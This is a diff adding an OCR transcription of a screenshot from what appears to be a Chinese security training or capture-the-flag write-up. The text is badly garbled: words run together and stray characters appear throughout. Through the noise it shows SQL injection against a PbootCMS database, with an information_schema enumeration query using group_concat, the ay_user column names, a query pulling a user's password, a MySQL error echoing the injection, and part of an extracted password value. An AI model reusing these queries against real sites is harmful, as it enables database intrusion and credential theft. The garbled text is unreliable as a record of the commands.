@@ -1,0 +1,30 @@
+# OCR: 3b4ed709713a9d64efad89ced256bd27.webp
+# 来源: ./02-WriteUp/2025/2025-能力验证-培训/3b4ed709713a9d64efad89ced256bd27.webp
+# 引擎: Umi-OCR 2.1.5 / PaddleOCR (config_chinese, limit_side_len=2880, multi_para)
+# 生成: 2026-11-03 15:35
+
+ay_role_level
+明ay_site
+回
+明ay_slide
+ay_user
+ay_syslogay_tagsay_type
+!ay_userrole"e
+X
+selectgroupconcat(column name)from information schema.columnswheretableschema=database()and ta
+/ 图
+def
+group_concat(column name）！
+dateuser,createtime,updatetimee
+eutid,ucode,username,realname,password,s
+selectpasswordfromayuserwhileusername="xiaoming"
+e(回#42oooYou have an error in your sQL syntax check the manual that correspondstoyourMysQL server e username="xiaoming"i at line 1
+Eselectpasswordfromay_userwhereusername="xiaoming
+<defpbootcmsayuserayuserpasswordpassword！国MXFhej3c3g=日
+号分组，45服务器分组，82turm(s）
+户端
+整个对话（27kB）
+显示为
+UTF-8
+图国
+No delta times
